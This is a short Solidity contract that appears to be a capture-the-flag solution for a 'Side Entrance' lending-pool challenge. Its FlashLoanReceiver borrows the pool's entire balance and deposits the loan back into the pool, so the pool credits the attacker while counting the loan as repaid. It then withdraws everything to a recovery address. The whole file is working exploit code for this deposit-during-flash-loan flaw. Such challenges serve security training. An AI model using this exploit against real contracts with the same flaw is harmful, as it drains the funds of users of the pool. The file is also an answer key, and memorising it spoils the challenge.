// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract FlashLoanReceiver {
  SideEntranceLenderPool pool;

  constructor(address _pool) {
    pool = SideEntranceLenderPool(_pool);
  }

  function attack() external {
    pool.flashLoan(address(pool).balance);
  }

  function execute() external payable {
    pool.deposit{value: address(this).balance}();
  }

  function withdraw(address payable _recovery) external {
    pool.withdraw();
    (bool success,) = _recovery.call{value: address(this).balance}("");
    require(success, "transfer failed");
  }

  fallback() external payable {

  }
}